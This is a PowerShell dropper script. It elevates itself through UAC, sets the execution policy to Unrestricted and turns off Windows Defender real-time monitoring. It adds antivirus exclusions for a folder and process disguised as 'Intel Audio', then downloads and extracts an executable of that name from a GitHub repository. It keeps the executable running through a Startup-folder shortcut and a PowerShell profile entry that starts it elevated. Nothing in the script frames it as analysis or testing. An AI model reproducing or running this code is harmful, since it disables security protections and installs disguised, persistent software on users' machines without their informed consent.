function IsAdministrator {
  $Identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
  $Principal = New-Object System.Security.Principal.WindowsPrincipal($Identity)
  $Principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}


function IsUacEnabled {
    (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System).EnableLua -ne 0
}

#
# Main script
#
if (!(IsAdministrator)) {
  if (IsUacEnabled) {
    [string[]]$argList = @('-NoProfile', '-NoExit', '-File', $MyInvocation.MyCommand.Path)
    $argList += $MyInvocation.BoundParameters.GetEnumerator() | Foreach { "-$($_.Key)", "$($_.Value)" }
    $argList += $MyInvocation.UnboundArguments
    Start-Process PowerShell.exe -Verb Runas -WorkingDirectory $pwd -ArgumentList $argList 
    return
  }
  else {
    throw "You must be administrator to run this script"
  }
}

#Elevated script content after that
$WScriptShell = New-Object -ComObject WScript.Shell
$FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$ShortcutFile = "$FolderPath\Intel Audio.lnk"
$TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio"
$TargetFile = "$TargetPath\Intel Audio.exe"
$TargetZip = "$TargetPath\Intel Audio.zip"
$PowershellPath = "$env:USERPROFILE\Documents\WindowsPowerShell"
$PowershellFile = "$PowershellPath\Microsoft.PowerShell_profile.ps1"

Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Write-Output "Execution policy updated"
Get-ExecutionPolicy -List

if (-Not (Test-Path $FolderPath)) {
  New-Item -ItemType Directory -Force -Path $FolderPath
  Write-Output "Startup folder created"
}

if (-Not (Test-Path $TargetPath)) {
  New-Item -ItemType Directory -Force -Path $TargetPath
  Write-Output "Target folder created"
}


Set-MpPreference -DisableRealtimeMonitoring $true 
Set-MpPreference -ExclusionProcess 'Intel Audio'
Set-MpPreference -ExclusionPath $FolderPath
Add-MpPreference -ExclusionPath $TargetPath
Add-MpPreference -ExclusionPath $TargetFile
Write-Output "Exclusions added"


if (-Not (Test-Path $TargetFile)) {
  Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/raw/refs/heads/main/dist/Intel Audio.zip" -OutFile $TargetZip
  Write-Output "File downloaded"
  Expand-Archive -Path $TargetZip -DestinationPath $TargetPath
  Write-Output "File extracted"
  Remove-Item -Path $TargetZip
  Write-Output "Zip file removed"
}

if (-Not (Test-Path $TargetFile)) {
  $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
  $Shortcut.TargetPath = $TargetFile
  $Shortcut.WorkingDirectory = $TargetPath
  $Shortcut.IconLocation = "$TargetPath\Intel Audio.exe,0"
  $Shortcut.Save()
  Write-Output "Shortcut created"
}

if (-Not (Test-Path $PowershellPath)) {
  New-Item -ItemType Directory -Force -Path $PowershellPath
  New-Item -ItemType File -Force -Path $PowershellFile
  Write-Output "Powershell profile created"
  Set-Content -Path $PowershellFile -Value "if (Test-Path $TargetFile) { if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile  -Verb RunAs -Confirm } }"
  Write-Output "Powershell profile updated"
}
if (Select-String -Path $PowershellFile "Start-Process") {
  Write-Output "Powershell profile already updated"
  if (Test-Path $TargetFile) {
    if (-Not (Get-Process -Name 'Intel Audio')) {
      Start-Process -FilePath $TargetFile -Verb RunAs -Confirm
    }
  }
  # exit 0
}
else {
  if (Test-Path $TargetFile) {
    Add-Content -Path $PowershellFile -Value "if (Test-Path $TargetFile) { if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile  -Verb RunAs -Confirm } }"
    Write-Output "Powershell profile updated"
    if (-Not (Get-Process -Name 'Intel Audio')) {
      Start-Process -FilePath $TargetFile -Verb RunAs -Confirm
      Write-Output "$TargetFile started"
    }
  }
}

